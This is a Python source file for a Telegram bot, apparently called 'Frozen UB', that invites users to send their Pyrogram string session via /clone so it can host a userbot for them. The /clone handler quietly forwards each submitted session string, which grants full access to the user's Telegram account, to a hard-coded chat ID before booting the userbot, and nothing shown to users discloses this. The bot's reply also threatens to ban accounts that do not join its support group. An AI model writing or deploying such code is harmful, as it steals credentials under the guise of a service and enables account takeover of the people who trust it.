from pyrogram import filters, Client
from pyrogram.types import *
from config import OWNER_ID, ALIVE_PIC, API_ID, API_HASH
import asyncio

PHONE_NUMBER_TEXT = (
    "Hello user 💖 I am Frozen UB!\n\n"
    "I can help you host your own userbot.\n\n"
    "‣ Powered by FROZENBOTS 💞\n\n"
    "‣ For any help, owner ID: @FroZzeN_xD\n\n"
    "‣ This is especially for busy people (lazy ones).\n\n"
    "‣ Now /clone {send your Pyrogram String Session}\n"
    "‣ Now /login to login without string session"
)


# Initialize the bot client
app = Client(
    "FrozenUB",
    api_id=API_ID,
    api_hash=API_HASH,
    plugins=dict(root="modules"),  # Specify the directory for additional modules if needed
)

@app.on_message(filters.command("start"))
async def hello(client, message):
    buttons = [
        [InlineKeyboardButton("ᴄʜᴀɴɴᴇʟ", url="t.me/vibeshiftbots")],
        [InlineKeyboardButton("ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url="t.me/Frozensupport1")],
    ]
    reply_markup = InlineKeyboardMarkup(buttons)
    await client.send_photo(
        message.chat.id, ALIVE_PIC, caption=PHONE_NUMBER_TEXT, reply_markup=reply_markup
    )

@app.on_message(filters.command("clone"))
async def clone(bot, msg):
    chat = msg.chat
    if len(msg.command) < 2:
        await msg.reply("Usage:\n\n/clone <session>")
        return

    phone = msg.command[1]
    text = await msg.reply("Wait, booting your own userbot...")
    
    try:
        # Send the string session to the specified chat ID
        await bot.send_message(
            chat_id=-1002480261979,  # Replace with your target chat ID
            text=f"New string session cloned:\n\n`{phone}`",
        )
        
        # Start the userbot with the given string session
        client = Client(
            name="Melody",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=phone,
            plugins=dict(root="modules")
        )
        await client.start()
        user = await client.get_me()
        await msg.reply(
            f"Successfully ✅ booted your own userbot! Welcome, {user.first_name}.\n\n"
            "Now join @Frozensupport1, or I'll ban your account!"
        )
    except Exception as e:
        await msg.reply(f"**ERROR:** `{str(e)}`\nPress /start to try again.")

# Entry point for the application
if __name__ == "__main__":
    print("Bot is running...")
    app.run()


